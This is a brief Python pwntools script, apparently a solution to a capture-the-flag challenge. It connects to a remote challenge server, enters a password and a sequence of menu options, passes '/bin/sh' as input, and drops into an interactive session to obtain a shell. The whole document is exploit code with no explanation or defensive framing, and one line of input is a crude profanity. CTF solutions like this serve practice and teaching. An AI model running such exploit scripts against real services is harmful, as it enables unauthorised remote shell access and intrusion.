from pwn import *

p = remote('asia.pwn.zh3r0.ml', 8520)

print p.recv()
p.sendline('th3_5had0w')
print p.recvuntil('> ')
p.sendline('1')
print p.recvuntil('> ')
p.sendline('fuck')
print p.recvuntil('> ')
p.sendline('3')
print p.recvuntil(':')
p.sendline('0')
print p.recvuntil('> ')
p.sendline('/bin/sh')
print p.recvuntil('> ')
p.sendline('2')
p.interactive()
